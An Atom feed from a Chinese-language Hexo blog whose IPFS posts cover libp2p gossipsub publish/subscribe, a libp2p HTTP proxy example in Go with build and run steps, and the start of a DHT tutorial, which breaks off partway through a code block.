<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>facert 的杂货店</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://facert.github.io/"/>
  <updated>2020-04-25T08:26:22.212Z</updated>
  <id>https://facert.github.io/</id>
  
  <author>
    <name>facert</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>深入理解 IPFS - 消费/订阅系统</title>
    <link href="https://facert.github.io/2020/04/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-IPFS-%E6%B6%88%E8%B4%B9-%E8%AE%A2%E9%98%85%E7%B3%BB%E7%BB%9F/"/>
    <id>https://facert.github.io/2020/04/25/深入理解-IPFS-消费-订阅系统/</id>
    <published>2020-04-25T08:25:57.000Z</published>
    <updated>2020-04-25T08:26:22.212Z</updated>
    
    <content type="html"><![CDATA[<p>本文译自：<a href="https://docs.libp2p.io/concepts/publish-subscribe/" target="_blank" rel="noopener">https://docs.libp2p.io/concepts/publish-subscribe/</a></p><p>发布/订阅系统是节点聚集在他们感兴趣的主题上。节点对这个主题感兴趣被称为订阅了此节点。</p><p><img src="/media/15872201968829.jpg" alt=""></p><p>节点可以发送消息给主题，每个消息都需要发送到订阅此主题的所有节点。</p><p><img src="/media/15872203338802.jpg" alt=""></p><p>使用 pub/sub 系统的例子</p><ul><li><strong>聊天室</strong> 每个聊天室都是一个主题，客户端发送聊天消息到聊天室，其他客户端都可以收到。</li><li><strong>文件共享</strong>  每个 pub/sub 主题代表一个可以下载的文件。上传者和文件的下载者通知他们所拥有的文件，在 pub/sub 系统之外协调下载。</li></ul><a id="more"></a><h4 id="设计目标"><a href="#设计目标" class="headerlink" title="设计目标"></a>设计目标</h4><p>在 pub/sub 系统中，所有节点都参与发送信息。有几个不同的设计点需要权衡。理想的属性包括:</p><ul><li><strong>可靠性</strong>:所有消息都能传递给所有订阅该主题的节点。 　　</li><li><strong>速度</strong>:消息传递迅速。 　　</li><li><strong>效率</strong>:网络不会充斥过量消息副本。 　　</li><li><strong>弹性</strong>:节点加入和离开网络时不会破坏它。没有中心节点故障。 　　</li><li><strong>规模</strong>:主题可以有大量的用户和能处理大吞吐量的消息。 　　</li><li><strong>简单性</strong>:该系统是容易理解和实现。每个节点只需存储少量的状态。</li></ul><p>libp2p 目前使用一个叫做 gossipsub 的设计。以此命名是因为节点互相发送他们知道的 gossip 消息来维护一个消息传递网络。</p><h4 id="节点发现"><a href="#节点发现" class="headerlink" title="节点发现"></a>节点发现</h4><p>在节点订阅主题之前，需找到其他节点，跟他们建立连接。pub/sub 系统自己没有办法发现节点，它依赖于节点发现服务。</p><p>以下是发现节点的方法：</p><ul><li>分布式哈希表</li><li>本地服务广播</li><li>跟已存在节点分享节点列表</li><li>中心化 trackers 或者约定节点</li><li>初始化节点列表</li></ul><p>比如，在 BitTorrent 应用中，上述方法都被用来下载文件。通过复用 BitTorrent 的节点发现逻辑，应用也可以创建一个健壮的 pub/sub 系统。</p><p>被发现节点会被询问他们是否支持 pub/sub 协议，如果支持，则将被加入到 pub/sub 网络中。</p><h4 id="节点类型"><a href="#节点类型" class="headerlink" title="节点类型"></a>节点类型</h4><p>在 gossipsub 中，节点以 <code>全消息</code> 节点或 <code>元数据</code> 节点连接彼此。网络结构也被分成两种：</p><p><img src="/media/15872877223807.jpg" alt=""></p><h5 id="全消息"><a href="#全消息" class="headerlink" title="全消息"></a>全消息</h5><p>全消息节点用来传递网络中完整的内容。网络中此类节点和少量同类节点相连。（在 <a href="https://github.com/libp2p/specs/blob/master/pubsub/gossipsub/README.md" target="_blank" rel="noopener">gossipsub specification</a> 中，这种网络被称为网格，网络中的节点称为网格成员。）</p><p>限制全消息节点数是有用的，可以让网络流量受到控制；每个节点只传递消息给少量节点比所有节点要好。每个节点有它想连接的目标数量的节点。在这个例子中，节点都想要被 3 个节点连接，实际有2-4 个连接。</p><p><img src="/media/15872884892477.jpg" alt=""></p><blockquote><p>节点数开发者可自定义</p></blockquote><p>节点度（也被称为网络度或 D）控制速度，可靠性，弹性，效率之间的权衡。一个高的节点度能帮助消息传播更快，因为有更大的机会接触到所有的订阅者，更少的机会被离开的节点所扰乱。当然，一个高节点度同样会引起额外重复消息的传递，加大带宽的开销。</p><p>在 libp2p 默认的实现节点度是 6，上下浮动 4-12。</p><h5 id="元消息"><a href="#元消息" class="headerlink" title="元消息"></a>元消息</h5><p>除了稀疏的全节点网络以外，还有密集的元消息节点网络，它由非全消息节点构成。</p><p>元消息网络共享哪些 gossip 消息可用以及帮助维护全消息节点网络。</p><p><img src="/media/15872892870491.jpg" alt=""></p><h5 id="嫁接和修剪"><a href="#嫁接和修剪" class="headerlink" title="嫁接和修剪"></a>嫁接和修剪</h5><p>节点是双向的，意味着任意两个互连的节点，都认为他们的连接是全消息或者元消息。</p><p>任意节点可以通过通知对方，来改变他们的连接类型，嫁接就是将元消息连接转成全消息，修剪是将全消息节点转成元消息。</p><p><img src="/media/15872895625610.jpg" alt=""></p><p>当一个节点有很少的全消息节点时，它会随机嫁接一些元消息节点为全消息节点。</p><p><img src="/media/15872896899989.jpg" alt=""></p><p>相反的，如果一个节点有很多全节点，它也会修剪一些节点到元节点。</p><p><img src="/media/15872897437561.jpg" alt=""></p><p>在 libp2p 实现中，所有节点 1 秒检查一次，成为心跳检测。嫁接和修剪也发生在此期间。</p><h4 id="订阅和退订"><a href="#订阅和退订" class="headerlink" title="订阅和退订"></a>订阅和退订</h4><p>节点记录他们直连的节点所订阅的主题。通过这个信息，每个节点都可以构建出一幅图像，包括他们周围的主题和主题都被哪些节点所订阅。</p><p><img src="/media/15872910929771.jpg" alt=""></p><p>记录节点发生在发送订阅和退订消息的时候，当两个节点间新连接建立时，它们开始发送给对方他们订阅的主题列表。</p><p><img src="/media/15872911962062.jpg" alt=""></p><p>随着时间的推移，无论一个节点订阅或退订一个主题，它都会将消息发送给其他节点。这些消息无论被接受节点对被订阅主题是否有疑问，都会被发送到已连接节点。</p><p><img src="/media/15872914445192.jpg" alt=""></p><p>订阅和退订消息会跟嫁接和修剪消息一起被发送。当节点订阅主题时，他会选择一些节点变成此主题的全消息节点，同时发送嫁接消息。</p><p><img src="/media/15872920779406.jpg" alt=""></p><p>当节点退订主题时，它将通知全消息节点把他们的连接修剪成元消息节点，同时发送退订消息。</p><p><img src="/media/15872921633734.jpg" alt=""></p><h4 id="发送消息"><a href="#发送消息" class="headerlink" title="发送消息"></a>发送消息</h4><p>当节点想发布一个消息，它会发送一个消息备份给所有它连接的全消息节点：</p><p><img src="/media/15872922476532.jpg" alt=""></p><p>类似的，当节点接收到另一个节点的新消息时，它将存储这个消息然后将这个备份发送给所有它连接的全消息节点：</p><p><img src="/media/15872923506664.jpg" alt=""></p><p>在 <a href="https://github.com/libp2p/specs/blob/master/pubsub/gossipsub/README.md" target="_blank" rel="noopener">gossipsub specification</a> 中,这种节点也被称为路由，因为他们在网络中路由消息。</p><p>节点保存了最近见到的消息列表。能让节点只在初次见到消息时有所行动，之后就会忽略。</p><p>节点也会选择校验他们接收到的消息。这取决于程序。比如，一个聊天程序强制所有消息要短于 100 字符。如果程序告诉 libp2p 消息无效，它将会被丢弃，也不会被再次发送到网络中。</p><h4 id="Gossip"><a href="#Gossip" class="headerlink" title="Gossip"></a>Gossip</h4><p>节点间相互八卦他们之前见到的消息，每秒所有节点都会随机选中 6 个元消息节点，发送给他们最近见到的消息。</p><p><img src="/media/15872931162221.jpg" alt=""></p><p>八卦机制给节点一个机会能被通知到他们错过的全消息网络上的消息。如果一个节点意识到他一直丢失消息，它会重置一些新的全消息节点。</p><p>这里有一个例子，一个特定的消息如何在元消息节点间传递。</p><p><img src="/media/15872933503864.jpg" alt=""></p><p>在 <a href="https://github.com/libp2p/specs/blob/master/pubsub/gossipsub/README.md" target="_blank" rel="noopener">gossipsub specification</a> 中，八卦最近看到的消息被称为 <code>IHAVE</code> 消息，请求特定消息被称为 <code>IWANT</code> 消息。</p><h4 id="扩散"><a href="#扩散" class="headerlink" title="扩散"></a>扩散</h4><p>节点被允许发布消息到它未订阅的主题上。这里有些特定规则来确保消息被可靠传递。</p><p>首先，一个节点想要发布消息到它未订阅的主题上，它随机选 6 个订阅该主题的节点（3 个如下所示），提醒它们作为扩散节点。</p><p><img src="/media/15872937598967.jpg" alt=""></p><p>和其他节点类型不同，扩散节点是单向的；它们总是从一个主题外的节点到主题内的节点。主题内节点并未被告知它们被选中，仍然会和其他元节点相连。</p><p>每次发送方想要发送消息，它将消息发送给扩散节点，然后扩散节点分发消息到主题内。</p><p><img src="/media/15872940138560.jpg" alt=""></p><p>如果发送方发送消息时发现一些扩散节点已下线，他将随机再选额外的扩散节点，直到 6 个节点。</p><p>当节点订阅了主题，如果它已经有一些扩散节点，它会将他们变成全消息节点：</p><p><img src="/media/15872941598723.jpg" alt=""></p><p>两分钟后没有消息再发送给这个主题，所有的扩散节点会被遗忘。</p><p><img src="/media/15872942032975.jpg" alt=""></p><h4 id="网络数据包"><a href="#网络数据包" class="headerlink" title="网络数据包"></a>网络数据包</h4><p>节点间相互发送的数据包是由各种类型组合起来的（应用消息，have/want, 订阅/退订, 嫁接/修剪），这种结构允许不同请求打包合并成一个请求发送。</p><p>如下：</p><p><img src="/media/15872944474148.jpg" alt=""></p><p>参见 <a href="https://github.com/libp2p/specs/blob/master/pubsub/gossipsub/README.md#protobuf" target="_blank" rel="noopener">specification</a>  <a href="https://developers.google.com/protocol-buffers" target="_blank" rel="noopener">Protocol Buffers</a> </p><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><p>这是一个每个节点必须记住的状态总结：</p><ul><li><strong>订阅</strong>：订阅的主题列表</li><li><strong>扩散主题</strong> 一些近期发送过消息但并未订阅的主题。每个主题的最近消息时间需保存。</li><li><strong>最近连接的节点列表</strong> 每个节点已连接的节点列表，以及他们都订阅过哪些主题，节点是全消息节点，元消息节点还是扩散节点。</li><li><strong>最近发送的消息</strong> 这是一份最近发送消息的缓存。它被用于检测和忽略重复消息。每个消息包括谁发送的和序列号，足够唯一标识这个消息。特别近期的消息，这条消息内容都会被保存，这样它可以将消息发送给其他节点。</li></ul><p><img src="/media/15872954228831.jpg" alt=""></p><h4 id="更多信息"><a href="#更多信息" class="headerlink" title="更多信息"></a>更多信息</h4><p>更多细节和 pub/sub 设计讨论，见 <a href="https://github.com/libp2p/specs/blob/master/pubsub/gossipsub/README.md" target="_blank" rel="noopener">gossipsub specification</a></p><p>实现详情，见 <a href="https://github.com/libp2p/go-libp2p-pubsub/blob/master/gossipsub.go" target="_blank" rel="noopener">gossipsub.go</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文译自：&lt;a href=&quot;https://docs.libp2p.io/concepts/publish-subscribe/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://docs.libp2p.io/concepts/publish-subscribe/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;发布/订阅系统是节点聚集在他们感兴趣的主题上。节点对这个主题感兴趣被称为订阅了此节点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/15872201968829.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;节点可以发送消息给主题，每个消息都需要发送到订阅此主题的所有节点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/15872203338802.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;使用 pub/sub 系统的例子&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;聊天室&lt;/strong&gt; 每个聊天室都是一个主题，客户端发送聊天消息到聊天室，其他客户端都可以收到。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件共享&lt;/strong&gt;  每个 pub/sub 主题代表一个可以下载的文件。上传者和文件的下载者通知他们所拥有的文件，在 pub/sub 系统之外协调下载。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 IPFS - 分布式代理</title>
    <link href="https://facert.github.io/2020/04/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-IPFS-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%A3%E7%90%86/"/>
    <id>https://facert.github.io/2020/04/25/深入理解-IPFS-分布式代理/</id>
    <published>2020-04-25T08:25:18.000Z</published>
    <updated>2020-04-25T08:25:41.642Z</updated>
    
    <content type="html"><![CDATA[<p>今天我们利用 libp2p 创建一个简单的分布式 http 代理，具体 demo 参见官方 example: <a href="https://github.com/libp2p/go-libp2p-examples/blob/master/http-proxy/proxy.go" target="_blank" rel="noopener">proxy.go</a></p><p>代理，同学们都很熟悉，不管是写爬虫，还是开发服务器，都或多或少的接触过。<br>本质上就是通过一个中间节点转发流量到目标地址。libp2p 也是一样，不过对他来说，每个节点都是平等的，理论上都可以作为客户端或者代理。另外他底层的 stream 模块也让开发变的更加容易。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                   XX  XXXXXX</span><br><span class="line">                                                                                                  X         XX</span><br><span class="line">                                                                                        XXXXXXX  XX          XX XXXXXXXXXX</span><br><span class="line">                  +----------------+                +-----------------+              XXX      XXX            XXX        XXX</span><br><span class="line"> HTTP Request     |                |                |                 |             XX                                    XX</span><br><span class="line">+-----------------&gt;                | libp2p stream  |                 |  HTTP       X                                      X</span><br><span class="line">                  |  Local peer    &lt;----------------&gt;  Remote peer    &lt;-------------&gt;     HTTP SERVER - THE INTERNET      XX</span><br><span class="line">&lt;-----------------+                |                |                 | Req &amp; Resp   XX                                   X</span><br><span class="line">  HTTP Response   |  libp2p host   |                |  libp2p host    |               XXXX XXXX XXXXXXXXXXXXXXXXXXXX   XXXX</span><br><span class="line">                  +----------------+                +-----------------+                                            XXXXX</span><br></pre></td></tr></table></figure><p>为了能够代理一个请求，我们需要先创建一个本地节点监听 <code>localhost:9900</code> 。HTTP requests 通过 libp2p stream 模块打到远程节点。远程节点发起 http 请求，并将 response 返回给本地节点，本地节点再中继返回给客户端。</p><a id="more"></a><h5 id="（一）远程节点"><a href="#（一）远程节点" class="headerlink" title="（一）远程节点"></a>（一）远程节点</h5><p>首先我们需要建立一个 libp2p 远程节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func makeRandomHost(port int) host.Host &#123;</span><br><span class="line">host, err := libp2p.New(context.Background(), libp2p.ListenAddrStrings(fmt.Sprintf(&quot;/ip4/127.0.0.1/tcp/%d&quot;, port)))</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">return host</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来需要为节点监听端口绑定 handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// Protocol 自己约定，为了能和 handler 匹配上</span><br><span class="line">host.SetStreamHandler(Protocol, streamHandler)</span><br><span class="line"></span><br><span class="line">func streamHandler(stream network.Stream) &#123;</span><br><span class="line">defer stream.Close()</span><br><span class="line">   </span><br><span class="line">   // 接收本地结果过来的请求</span><br><span class="line">   // 从 stream 中读取 request 的 data</span><br><span class="line">buf := bufio.NewReader(stream)</span><br><span class="line">// Read the HTTP request from the buffer</span><br><span class="line">req, err := http.ReadRequest(buf)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">stream.Reset()</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">defer req.Body.Close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 重置一些 http 字段</span><br><span class="line">req.URL.Scheme = &quot;http&quot;</span><br><span class="line">hp := strings.Split(req.Host, &quot;:&quot;)</span><br><span class="line">if len(hp) &gt; 1 &amp;&amp; hp[1] == &quot;443&quot; &#123;</span><br><span class="line">req.URL.Scheme = &quot;https&quot;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">req.URL.Scheme = &quot;http&quot;</span><br><span class="line">&#125;</span><br><span class="line">req.URL.Host = req.Host</span><br><span class="line"></span><br><span class="line">outreq := new(http.Request)</span><br><span class="line">*outreq = *req</span><br><span class="line"></span><br><span class="line">  // 发起请求到目标地址</span><br><span class="line">resp, err := http.DefaultTransport.RoundTrip(outreq)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">stream.Reset()</span><br><span class="line">log.Println(err)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 将 resp 写回到 stream</span><br><span class="line">resp.Write(stream)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>#####（二）本地节点</p><p>本地节点需要能处理 http 请求，然后将请求转发给远程节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// ServeHTTP 实现了 http.Handler 的接口</span><br><span class="line">func (p *ProxyService) ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">fmt.Printf(&quot;proxying request for %s to peer %s\n&quot;, r.URL, p.dest.Pretty())</span><br><span class="line">// 将 request 请求发送到远程节点</span><br><span class="line">stream, _ := p.host.NewStream(context.Background(), p.dest, Protocol)</span><br><span class="line"></span><br><span class="line">defer stream.Close()</span><br><span class="line"></span><br><span class="line">// r.Write() 将 http 请求数据写入到 stream 里面</span><br><span class="line">_ = r.Write(stream)</span><br><span class="line"></span><br><span class="line">// 将 remote response 写回到 http response 里面</span><br><span class="line">buf := bufio.NewReader(stream)</span><br><span class="line">resp, _ := http.ReadResponse(buf, r)</span><br><span class="line"></span><br><span class="line">// 写 headers</span><br><span class="line">for k, v := range resp.Header &#123;</span><br><span class="line">for _, s := range v &#123;</span><br><span class="line">w.Header().Add(k, s)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  // 写 StatusCode</span><br><span class="line">w.WriteHeader(resp.StatusCode)</span><br><span class="line"></span><br><span class="line">// 最后 copy body</span><br><span class="line">io.Copy(w, resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体代码见： <a href="https://github.com/libp2p/go-libp2p-examples/blob/master/http-proxy/proxy.go" target="_blank" rel="noopener">proxy.go</a></p><p>#####（三） 运行</p><h6 id="build"><a href="#build" class="headerlink" title="build"></a>build</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; make deps</span><br><span class="line">&gt; cd http-proxy/</span><br><span class="line">&gt; go build</span><br></pre></td></tr></table></figure><h6 id="run"><a href="#run" class="headerlink" title="run"></a>run</h6><ol><li><p>首先我们运行 remote 节点</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./http-proxy</span><br><span class="line">Proxy server is ready</span><br><span class="line">libp2p-peer addresses:</span><br><span class="line">/ip4/127.0.0.1/tcp/12000/p2p/QmddTrQXhA9AkCpXPTkcY7e22NK73TwkUms3a44DhTKJTD</span><br></pre></td></tr></table></figure></li><li><p>然后运行本地节点 -d 参数后面就是上面运行的 remote 节点的地址</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; ./http-proxy -d /ip4/127.0.0.1/tcp/12000/p2p/QmddTrQXhA9AkCpXPTkcY7e22NK73TwkUms3a44DhTKJTD</span><br><span class="line">Proxy server is ready</span><br><span class="line">libp2p-peer addresses:</span><br><span class="line">/ip4/127.0.0.1/tcp/12001/p2p/Qmaa2AYTha1UqcFVX97p9R1UP7vbzDLY7bqWsZw1135QvN</span><br><span class="line">proxy listening on  127.0.0.1:9900</span><br></pre></td></tr></table></figure></li><li><p>本地代理监听 <code>127.0.0.1:9900</code>, 我们用 curl 命令请求下看看效果</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; curl -x &quot;127.0.0.1:9900&quot; &quot;http://ipfs.io/p2p/QmfUX75pGRBRDnjeoMkQzuQczuCup2aYbeLxz5NzeSu9G6&quot;</span><br><span class="line">it works!</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天我们利用 libp2p 创建一个简单的分布式 http 代理，具体 demo 参见官方 example: &lt;a href=&quot;https://github.com/libp2p/go-libp2p-examples/blob/master/http-proxy/proxy.go&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;proxy.go&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代理，同学们都很熟悉，不管是写爬虫，还是开发服务器，都或多或少的接触过。&lt;br&gt;本质上就是通过一个中间节点转发流量到目标地址。libp2p 也是一样，不过对他来说，每个节点都是平等的，理论上都可以作为客户端或者代理。另外他底层的 stream 模块也让开发变的更加容易。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;                                                                                                   XX  XXXXXX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                                                                  X         XX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                                                        XXXXXXX  XX          XX XXXXXXXXXX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  +----------------+                +-----------------+              XXX      XXX            XXX        XXX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; HTTP Request     |                |                |                 |             XX                                    XX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+-----------------&amp;gt;                | libp2p stream  |                 |  HTTP       X                                      X&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  |  Local peer    &amp;lt;----------------&amp;gt;  Remote peer    &amp;lt;-------------&amp;gt;     HTTP SERVER - THE INTERNET      XX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;-----------------+                |                |                 | Req &amp;amp; Resp   XX                                   X&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  HTTP Response   |  libp2p host   |                |  libp2p host    |               XXXX XXXX XXXXXXXXXXXXXXXXXXXX   XXXX&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  +----------------+                +-----------------+                                            XXXXX&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为了能够代理一个请求，我们需要先创建一个本地节点监听 &lt;code&gt;localhost:9900&lt;/code&gt; 。HTTP requests 通过 libp2p stream 模块打到远程节点。远程节点发起 http 请求，并将 response 返回给本地节点，本地节点再中继返回给客户端。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ipfs" scheme="https://facert.github.io/tags/ipfs/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 IPFS - DHT 网络（1）</title>
    <link href="https://facert.github.io/2020/04/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-IPFS-DHT-%E7%BD%91%E7%BB%9C%EF%BC%881%EF%BC%89/"/>
    <id>https://facert.github.io/2020/04/25/深入理解-IPFS-DHT-网络（1）/</id>
    <published>2020-04-25T08:24:02.000Z</published>
    <updated>2020-04-25T08:25:03.618Z</updated>
    
    <content type="html"><![CDATA[<p>在前面的文章中，我们说过，DHT（分布式哈希表）是 IPFS 一个重要的组成部分，接下来我们会分别从应用，原理两个方面来分析 DHT。</p><p>IPFS 的网络层源码在 <a href="https://github.com/libp2p" target="_blank" rel="noopener">libp2p</a> 中，本文用 <a href="https://github.com/libp2p/go-libp2p" target="_blank" rel="noopener">go-libp2p</a> 做分析。</p><p>我们假设一个场景应用，有两个节点名字分别叫 earth 和 mars，然后他们分别加入了 DHT 网络，接下来他们需要找到对方，并能够互相发送消息。</p><a id="more"></a><h5 id="（一）初始化节点"><a href="#（一）初始化节点" class="headerlink" title="（一）初始化节点"></a>（一）初始化节点</h5><p>首先我们需要初始化节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctx := context.Background()</span><br><span class="line">listenAddresses, _ := multiaddr.NewMultiaddr(&quot;/ip4/127.0.0.1/tcp/8004&quot;)</span><br><span class="line">host, _ := libp2p.New(ctx, libp2p.ListenAddrs([]multiaddr.Multiaddr&#123;listenAddresses&#125;...))</span><br><span class="line">fmt.Println(&quot;host-&gt;&quot;, host.ID())</span><br></pre></td></tr></table></figure><p>其实初始化就一行 <code>libp2p.New()</code>，可自定义参数，比如上面我们定义了监听地址和端口 <code>/ip4/127.0.0.1/tcp/8004</code>， 等同于 <code>127.0.0.1:8004</code> 不过自解释性更强。</p><p>再举个例子，<code>/ip4/1.2.3.4/tcp/4321/p2p/QmcEPrat8ShnCph8WjkREzt5CPXF2RwhYxYBALDcLC1iV6</code> 结尾有个 PeerId <code>QmcEPrat8ShnCph8WjkREzt5CPXF2RwhYxYBALDcLC1iV6</code></p><p>那么不仅仅可以通过 ip + port 寻址，通过 PeerId 也可以直接定位到节点。</p><p>初始化后我们生成了一个节点，节点 ID 以 btc58encode 编码：QmcEPrat8ShnCph8WjkREzt5CPXF2RwhYxYBALDcLC1iV6，也就是上文的 PeerID。</p><p>接下来我们需要给 8004 监听的端口配置 handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">func handleStream(stream network.Stream) &#123;</span><br><span class="line">log.Println(&quot;Got a new stream!&quot;, stream)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">host.SetStreamHandler(protocol.ID(&apos;/chat/1.0&apos;), handleStream)</span><br></pre></td></tr></table></figure><p><code>handleStream</code> 这个函数的逻辑跟普通的 socket 编程一样，拿到 stream 往里读写数据就行，这里不细讲。</p><h5 id="（二）加入-DHT-网络"><a href="#（二）加入-DHT-网络" class="headerlink" title="（二）加入 DHT 网络"></a>（二）加入 DHT 网络</h5><p>节点建立完成后，接下来就需要加入 DHT 网络了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 